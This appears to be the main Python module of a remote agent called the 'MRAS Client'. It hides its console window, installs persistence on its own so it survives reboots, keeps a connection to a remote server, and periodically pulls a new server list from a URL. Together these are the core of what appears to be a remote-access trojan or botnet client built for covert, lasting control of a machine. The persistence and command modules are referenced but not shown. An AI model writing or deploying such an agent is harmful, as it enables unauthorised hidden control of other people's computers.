"""
MRAS Client — remote agent.
Runs silently in the background, survives reboots, reconnects automatically.
"""
from __future__ import annotations
import asyncio
import logging
import logging.handlers
import os
import sys
from pathlib import Path

import yaml

# ── Path bootstrap (works both as .py and frozen PyInstaller binary) ────────
if getattr(sys, "frozen", False):
    _ROOT = Path(sys.executable).parent
else:
    _ROOT = Path(__file__).resolve().parents[1]

sys.path.insert(0, str(_ROOT))

from client.persistence import hide_console, install, is_installed
from client.connection import ClientConnection


def load_config() -> dict:
    config_path = Path(__file__).parent / "config.yaml"
    with open(config_path) as f:
        cfg = yaml.safe_load(f)
    cfg["client"]["secret"] = os.environ.get("MRAS_SECRET", cfg["client"]["secret"])
    return cfg


def setup_logging(cfg: dict) -> None:
    lc = cfg["logging"]
    log_dir = _ROOT / "logs"
    log_dir.mkdir(exist_ok=True)
    log_file = log_dir / Path(lc["file"]).name
    level = getattr(logging, lc["level"].upper(), logging.INFO)
    fmt = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
    fh = logging.handlers.RotatingFileHandler(
        str(log_file), maxBytes=5 * 1024 * 1024, backupCount=3, encoding="utf-8"
    )
    fh.setFormatter(logging.Formatter(fmt))
    handlers: list[logging.Handler] = [fh]
    if sys.stdout and sys.stdout.isatty():
        handlers.append(logging.StreamHandler())
    logging.basicConfig(level=level, format=fmt, handlers=handlers)


async def config_update_loop(cfg: dict) -> None:
    """Periodically fetch an updated server list from a remote URL."""
    url: str = cfg["client"].get("config_update_url", "")
    interval: int = cfg["client"].get("config_update_interval", 300)
    if not url:
        return
    while True:
        await asyncio.sleep(interval)
        try:
            import urllib.request, json
            with urllib.request.urlopen(url, timeout=10) as resp:
                data = json.loads(resp.read())
            servers = data.get("servers", [])
            if servers:
                from client.commands.change_server import _update_servers
                _update_servers(servers)
                logging.getLogger("mras.client").info("Config update applied: %s", servers)
        except Exception as exc:
            logging.getLogger("mras.client").debug("Config update failed: %s", exc)


async def main() -> None:
    # Hide console window immediately on Windows
    hide_console()

    cfg = load_config()
    setup_logging(cfg)
    log = logging.getLogger("mras.client")
    log.info("MRAS Client starting")

    # Install persistence if not already present
    if not is_installed():
        if install():
            log.info("Persistence installed successfully")
        else:
            log.warning("Persistence installation failed")

    conn = ClientConnection(cfg)
    await asyncio.gather(
        conn.run(),
        config_update_loop(cfg),
    )


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
